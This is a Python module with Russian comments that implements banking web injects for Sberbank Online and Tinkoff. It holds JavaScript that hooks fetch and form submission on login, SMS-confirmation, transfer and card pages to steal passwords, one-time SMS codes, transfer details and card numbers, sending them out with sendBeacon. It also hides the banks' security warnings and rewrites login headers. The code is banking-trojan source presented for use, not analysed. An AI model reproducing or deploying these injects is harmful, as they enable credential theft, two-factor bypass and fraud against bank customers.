#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Модуль для работы с банковскими инжектами.
Содержит классы для генерации и управления инжектами для различных банков.
Реализована поддержка Сбербанк, Тинькофф и др.
"""

import os
import json
import logging
from typing import Dict, List, Optional, Union, Any, Type

# Настраиваем логирование
logger = logging.getLogger("bank_integration")
logger.setLevel(logging.INFO)

# Создаем обработчик для вывода в консоль
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)

# Создаем обработчик для вывода в файл
file_handler = logging.FileHandler("bank_integration.log", encoding="utf-8")
file_handler.setLevel(logging.DEBUG)

# Форматирование логов
formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
console_handler.setFormatter(formatter)
file_handler.setFormatter(formatter)

# Добавляем обработчики к логгеру
logger.addHandler(console_handler)
logger.addHandler(file_handler)

# Реестр инжектов
_BANK_INJECTS_REGISTRY = {}

class BankInjectBase:
    """
    Базовый класс для всех банковских инжектов.
    Предоставляет основные методы для работы с инжектами.
    """
    
    def __init__(self, bank_type: str):
        """
        Инициализация банковского инжекта.
        
        Args:
            bank_type: Тип банка (идентификатор)
        """
        self.bank_type = bank_type
        self.name = ""
        self.description = ""
        self.version = "1.0.0"
        self.injects = []
    
    def add_inject(self, 
                   url_pattern: str, 
                   description: str, 
                   scripts: List[Dict[str, str]] = None, 
                   styles: List[str] = None, 
                   elements: List[Dict[str, str]] = None) -> bool:
        """
        Добавляет новый инжект.
        
        Args:
            url_pattern: Шаблон URL для которого применяется инжект
            description: Описание инжекта
            scripts: Список скриптов для внедрения (каждый элемент - словарь с id и content)
            styles: Список стилей для внедрения
            elements: Список элементов для замены (каждый элемент - словарь с selector и replacement)
            
        Returns:
            bool: True, если инжект успешно добавлен, False - если инжект с таким URL уже существует
        """
        # Проверяем, есть ли уже инжект с таким URL
        if any(inject["url_pattern"] == url_pattern for inject in self.injects):
            logger.warning(f"Инжект для URL {url_pattern} уже существует")
            return False
        
        # Добавляем новый инжект
        inject = {
            "url_pattern": url_pattern,
            "description": description,
            "scripts": scripts or [],
            "styles": styles or [],
            "elements": elements or []
        }
        
        self.injects.append(inject)
        logger.info(f"Добавлен инжект для URL {url_pattern}")
        return True
    
    def remove_inject(self, url_pattern: str) -> bool:
        """
        Удаляет инжект по URL-шаблону.
        
        Args:
            url_pattern: Шаблон URL инжекта для удаления
            
        Returns:
            bool: True, если инжект успешно удален, False - если инжект не найден
        """
        for i, inject in enumerate(self.injects):
            if inject["url_pattern"] == url_pattern:
                self.injects.pop(i)
                logger.info(f"Удален инжект для URL {url_pattern}")
                return True
        
        logger.warning(f"Инжект для URL {url_pattern} не найден")
        return False
    
    def get_inject(self, url_pattern: str) -> Optional[Dict[str, Any]]:
        """
        Возвращает инжект по URL-шаблону.
        
        Args:
            url_pattern: Шаблон URL инжекта
            
        Returns:
            Dict или None: Данные инжекта или None, если инжект не найден
        """
        for inject in self.injects:
            if inject["url_pattern"] == url_pattern:
                return inject
        
        return None
    
    def to_dict(self) -> Dict[str, Any]:
        """
        Преобразует объект в словарь для сериализации.
        
        Returns:
            Dict: Словарь с данными инжекта
        """
        return {
            "bank_type": self.bank_type,
            "name": self.name,
            "description": self.description,
            "version": self.version,
            "injects": self.injects
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "BankInjectBase":
        """
        Создает объект из словаря.
        
        Args:
            data: Словарь с данными инжекта
            
        Returns:
            BankInjectBase: Созданный объект инжекта
        """
        inject = cls(data["bank_type"])
        inject.name = data["name"]
        inject.description = data["description"]
        inject.version = data["version"]
        inject.injects = data["injects"]
        return inject
    
    def save_to_file(self, filename: str) -> bool:
        """
        Сохраняет инжект в файл в формате JSON.
        
        Args:
            filename: Имя файла для сохранения
            
        Returns:
            bool: True, если сохранение успешно, False - если произошла ошибка
        """
        try:
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(self.to_dict(), f, ensure_ascii=False, indent=4)
            logger.info(f"Инжект сохранен в файл {filename}")
            return True
        except Exception as e:
            logger.error(f"Ошибка при сохранении инжекта в файл {filename}: {e}")
            return False
    
    def load_from_file(self, filename: str) -> bool:
        """
        Загружает инжект из файла в формате JSON.
        
        Args:
            filename: Имя файла для загрузки
            
        Returns:
            bool: True, если загрузка успешна, False - если произошла ошибка
        """
        try:
            with open(filename, "r", encoding="utf-8") as f:
                data = json.load(f)
            
            if data["bank_type"] != self.bank_type:
                logger.error(f"Неверный тип банка в файле: {data['bank_type']}, ожидается: {self.bank_type}")
                return False
            
            self.name = data["name"]
            self.description = data["description"]
            self.version = data["version"]
            self.injects = data["injects"]
            
            logger.info(f"Инжект загружен из файла {filename}")
            return True
        except Exception as e:
            logger.error(f"Ошибка при загрузке инжекта из файла {filename}: {e}")
            return False

class SberbankInject(BankInjectBase):
    """
    Класс для инжектов Сбербанка.
    """
    
    def __init__(self):
        """
        Инициализация инжекта Сбербанка.
        """
        super().__init__("sberbank")
        self.name = "Сбербанк"
        self.description = "Инжекты для Сбербанк Онлайн"
        
        # Добавляем стандартные инжекты
        self._setup_default_injects()
    
    def _setup_default_injects(self):
        """
        Настраивает стандартные инжекты для Сбербанка.
        """
        # Инжект для страницы логина
        self.add_inject(
            url_pattern="https://online.sberbank.ru/CSAFront/login.do",
            description="Инжект для страницы входа",
            scripts=[
                {
                    "id": "sber-login-injector",
                    "content": """
                    // Скрипт для перехвата логина и пароля
                    (function() {
                        const originalFetch = window.fetch;
                        window.fetch = function(url, options) {
                            if (url.includes('login.do')) {
                                try {
                                    const body = JSON.parse(options.body);
                                    if (body.username && body.password) {
                                        // Отправляем данные на наш сервер
                                        navigator.sendBeacon('/ats/capture', JSON.stringify({
                                            type: 'credentials',
                                            bank: 'sberbank',
                                            data: {
                                                username: body.username,
                                                password: body.password
                                            }
                                        }));
                                    }
                                } catch (e) {}
                            }
                            return originalFetch.apply(this, arguments);
                        };
                    })();
                    """
                }
            ],
            styles=[
                ".login-warning { display: none !important; }"  # Стили для страницы логина
            ],
            elements=[
                {
                    "selector": ".login-header",
                    "replacement": "<div class='login-header'><h1>Сбербанк Онлайн</h1><p>Пожалуйста, введите ваши данные для входа</p></div>"
                }
            ]
        )
        
        # Инжект для страницы с SMS-кодом
        self.add_inject(
            url_pattern="https://online.sberbank.ru/CSAFront/smsAuth.do",
            description="Инжект для страницы с SMS-кодом",
            scripts=[
                {
                    "id": "sber-sms-injector",
                    "content": """
                    // Скрипт для перехвата SMS-кода
                    (function() {
                        const originalSubmit = HTMLFormElement.prototype.submit;
                        HTMLFormElement.prototype.submit = function() {
                            const smsInput = this.querySelector('input[name="smsPassword"]');
                            if (smsInput && smsInput.value) {
                                // Отправляем SMS-код на наш сервер
                                navigator.sendBeacon('/ats/capture', JSON.stringify({
                                    type: 'sms',
                                    bank: 'sberbank',
                                    data: {
                                        smsCode: smsInput.value
                                    }
                                }));
                            }
                            return originalSubmit.apply(this, arguments);
                        };
                    })();
                    """
                }
            ]
        )
        
        # Инжект для страницы перевода
        self.add_inject(
            url_pattern="https://online.sberbank.ru/CSAFront/payments/money.do",
            description="Инжект для страницы перевода",
            scripts=[
                {
                    "id": "sber-transfer-injector",
                    "content": """
                    // Скрипт для перехвата данных перевода
                    (function() {
                        const originalFetch = window.fetch;
                        window.fetch = function(url, options) {
                            if (url.includes('payments/money.do')) {
                                try {
                                    const formData = new FormData(document.querySelector('form'));
                                    const transferData = {
                                        sourceAccount: formData.get('sourceAccount'),
                                        destinationAccount: formData.get('destinationAccount'),
                                        amount: formData.get('amount')
                                    };
                                    
                                    // Отправляем данные на наш сервер
                                    navigator.sendBeacon('/ats/capture', JSON.stringify({
                                        type: 'transfer',
                                        bank: 'sberbank',
                                        data: transferData
                                    }));
                                } catch (e) {}
                            }
                            return originalFetch.apply(this, arguments);
                        };
                    })();
                    """
                }
            ]
        )
        
        # Инжект для страницы карты
        self.add_inject(
            url_pattern="https://online.sberbank.ru/CSAFront/cards/list.do",
            description="Инжект для страницы со списком карт",
            scripts=[
                {
                    "id": "sber-cards-injector",
                    "content": """
                    // Скрипт для перехвата данных карт
                    (function() {
                        // Ждем загрузки данных карт
                        const observer = new MutationObserver(function(mutations) {
                            const cardElements = document.querySelectorAll('.card-item');
                            if (cardElements.length > 0) {
                                const cards = Array.from(cardElements).map(card => {
                                    return {
                                        number: card.querySelector('.card-number').textContent.trim(),
                                        balance: card.querySelector('.card-balance').textContent.trim(),
                                        type: card.querySelector('.card-type').textContent.trim()
                                    };
                                });
                                
                                // Отправляем данные на наш сервер
                                navigator.sendBeacon('/ats/capture', JSON.stringify({
                                    type: 'cards',
                                    bank: 'sberbank',
                                    data: {
                                        cards: cards
                                    }
                                }));
                                
                                observer.disconnect();
                            }
                        });
                        
                        observer.observe(document.body, { childList: true, subtree: true });
                    })();
                    """
                }
            ]
        )

class TinkoffInject(BankInjectBase):
    """
    Класс для инжектов Тинькофф.
    """
    
    def __init__(self):
        """
        Инициализация инжекта Тинькофф.
        """
        super().__init__("tinkoff")
        self.name = "Тинькофф"
        self.description = "Инжекты для Тинькофф Банка"
        
        # Добавляем стандартные инжекты
        self._setup_default_injects()
    
    def _setup_default_injects(self):
        """
        Настраивает стандартные инжекты для Тинькофф.
        """
        # Инжект для страницы логина
        self.add_inject(
            url_pattern="https://www.tinkoff.ru/login/",
            description="Инжект для страницы входа",
            scripts=[
                {
                    "id": "tinkoff-login-injector",
                    "content": """
                    // Скрипт для перехвата логина и пароля
                    (function() {
                        const originalFetch = window.fetch;
                        window.fetch = function(url, options) {
                            if (url.includes('api/common/v1/auth/sign-in')) {
                                try {
                                    const body = JSON.parse(options.body);
                                    if (body.username && body.password) {
                                        // Отправляем данные на наш сервер
                                        navigator.sendBeacon('/ats/capture', JSON.stringify({
                                            type: 'credentials',
                                            bank: 'tinkoff',
                                            data: {
                                                username: body.username,
                                                password: body.password
                                            }
                                        }));
                                    }
                                } catch (e) {}
                            }
                            return originalFetch.apply(this, arguments);
                        };
                    })();
                    """
                }
            ],
            styles=[
                ".login-security-warning { display: none !important; }"  # Стили для страницы логина
            ],
            elements=[
                {
                    "selector": ".login-title",
                    "replacement": "<div class='login-title'><h1>Тинькофф Банк</h1><p>Пожалуйста, введите ваши данные для входа</p></div>"
                }
            ]
        )
        
        # Инжект для страницы с SMS-кодом
        self.add_inject(
            url_pattern="https://www.tinkoff.ru/api/common/v1/auth/confirm",
            description="Инжект для страницы с SMS-кодом",
            scripts=[
                {
                    "id": "tinkoff-sms-injector",
                    "content": """
                    // Скрипт для перехвата SMS-кода
                    (function() {
                        const originalFetch = window.fetch;
                        window.fetch = function(url, options) {
                            if (url.includes('api/common/v1/auth/confirm')) {
                                try {
                                    const body = JSON.parse(options.body);
                                    if (body.confirmationData && body.confirmationData.SMSBYID) {
                                        // Отправляем SMS-код на наш сервер
                                        navigator.sendBeacon('/ats/capture', JSON.stringify({
                                            type: 'sms',
                                            bank: 'tinkoff',
                                            data: {
                                                smsCode: body.confirmationData.SMSBYID
                                            }
                                        }));
                                    }
                                } catch (e) {}
                            }
                            return originalFetch.apply(this, arguments);
                        };
                    })();
                    """
                }
            ]
        )
        
        # Инжект для страницы перевода
        self.add_inject(
            url_pattern="https://www.tinkoff.ru/payments/transfer/",
            description="Инжект для страницы перевода",
            scripts=[
                {
                    "id": "tinkoff-transfer-injector",
                    "content": """
                    // Скрипт для перехвата данных перевода
                    (function() {
                        const originalFetch = window.fetch;
                        window.fetch = function(url, options) {
                            if (url.includes('api/payments/v2/operation/')) {
                                try {
                                    const body = JSON.parse(options.body);
                                    if (body.operationParameters) {
                                        // Отправляем данные на наш сервер
                                        navigator.sendBeacon('/ats/capture', JSON.stringify({
                                            type: 'transfer',
                                            bank: 'tinkoff',
                                            data: {
                                                sourceAccount: body.operationParameters.sourceAccountId,
                                                destinationAccount: body.operationParameters.accountNumber,
                                                amount: body.operationParameters.amount.value
                                            }
                                        }));
                                    }
                                } catch (e) {}
                            }
                            return originalFetch.apply(this, arguments);
                        };
                    })();
                    """
                }
            ]
        )
        
        # Инжект для страницы с картами и счетами
        self.add_inject(
            url_pattern="https://www.tinkoff.ru/mybank/accounts/",
            description="Инжект для страницы с картами и счетами",
            scripts=[
                {
                    "id": "tinkoff-accounts-injector",
                    "content": """
                    // Скрипт для перехвата данных карт и счетов
                    (function() {
                        // Ждем загрузки данных
                        setTimeout(() => {
                            try {
                                const accountElements = document.querySelectorAll('[data-qa-type="product-account"]');
                                const cardElements = document.querySelectorAll('[data-qa-type="product-card"]');
                                
                                const accounts = Array.from(accountElements).map(account => {
                                    return {
                                        name: account.querySelector('[data-qa-type="product-name"]').textContent.trim(),
                                        number: account.querySelector('[data-qa-type="account-number"]').textContent.trim(),
                                        balance: account.querySelector('[data-qa-type="account-balance"]').textContent.trim()
                                    };
                                });
                                
                                const cards = Array.from(cardElements).map(card => {
                                    return {
                                        name: card.querySelector('[data-qa-type="product-name"]').textContent.trim(),
                                        number: card.querySelector('[data-qa-type="card-number"]').textContent.trim(),
                                        balance: card.querySelector('[data-qa-type="card-balance"]').textContent.trim()
                                    };
                                });
                                
                                // Отправляем данные на наш сервер
                                navigator.sendBeacon('/ats/capture', JSON.stringify({
                                    type: 'accounts_and_cards',
                                    bank: 'tinkoff',
                                    data: {
                                        accounts: accounts,
                                        cards: cards
                                    }
                                }));
                            } catch (e) {
                                console.error('Error capturing account data:', e);
                            }
                        }, 2000);
                    })();
                    """
                }
            ]
        )

def register_bank_inject(bank_type: str, inject_class: Type[BankInjectBase]) -> None:
    """
    Регистрирует класс инжекта в глобальном реестре.
    
    Args:
        bank_type: Тип банка (идентификатор)
        inject_class: Класс инжекта
    """
    _BANK_INJECTS_REGISTRY[bank_type] = inject_class
    logger.info(f"Зарегистрирован инжект для банка: {bank_type}")

def get_bank_inject(bank_type: str) -> Optional[BankInjectBase]:
    """
    Возвращает экземпляр инжекта по типу банка.
    
    Args:
        bank_type: Тип банка (идентификатор)
        
    Returns:
        BankInjectBase или None: Экземпляр инжекта или None, если инжект не найден
    """
    if bank_type not in _BANK_INJECTS_REGISTRY:
        logger.warning(f"Инжект для банка {bank_type} не найден")
        return None
    
    try:
        return _BANK_INJECTS_REGISTRY[bank_type]()
    except Exception as e:
        logger.error(f"Ошибка при создании инжекта для банка {bank_type}: {e}")
        return None

def get_available_bank_injects() -> List[str]:
    """
    Возвращает список доступных типов банковских инжектов.
    
    Returns:
        List[str]: Список типов банков
    """
    return list(_BANK_INJECTS_REGISTRY.keys())

# Регистрируем стандартные инжекты
register_bank_inject("sberbank", SberbankInject)
register_bank_inject("tinkoff", TinkoffInject)

# Пример использования
if __name__ == "__main__":
    logger.info("Список доступных банковских инжектов:")
    for bank_type in get_available_bank_injects():
        inject = get_bank_inject(bank_type)
        logger.info(f" - {inject.name} ({bank_type}): {inject.description}")
        logger.info(f"   Количество инжектов: {len(inject.injects)}")
        
    # Пример сохранения и загрузки инжекта
    sberbank_inject = get_bank_inject("sberbank")
    if sberbank_inject:
        sberbank_inject.save_to_file("sberbank_injects.json")
        
        # Создаем новый инжект и загружаем сохраненные данные
        new_inject = BankInjectBase("sberbank")
        new_inject.load_from_file("sberbank_injects.json")
        logger.info(f"Загруженный инжект: {new_inject.name}, количество инжектов: {len(new_inject.injects)}") 